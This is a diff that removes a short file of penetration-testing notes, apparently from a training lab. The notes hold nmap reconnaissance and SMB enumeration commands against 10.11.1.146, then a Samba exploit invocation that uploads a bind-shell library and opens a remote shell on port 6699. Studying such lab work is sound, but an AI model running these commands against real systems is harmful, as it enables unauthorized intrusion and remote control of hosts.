@@ -1,6 +1,0 @@
-
-nmap -sTVC 10.11.1.146 -Pn  -p- > nmap.txt
-nmap -v -p 139, 445 --script=smb* 10.11.1.146 > smb.txt
-nmap --script=smb-enum-shares -Pn -p 445 10.11.1.146
-
-./exploit.py -t <target> -e libbindshell-samba.so   -s <share> -r <location>/libbindshell-samba.so  -u <user> -p <password> -P 6699
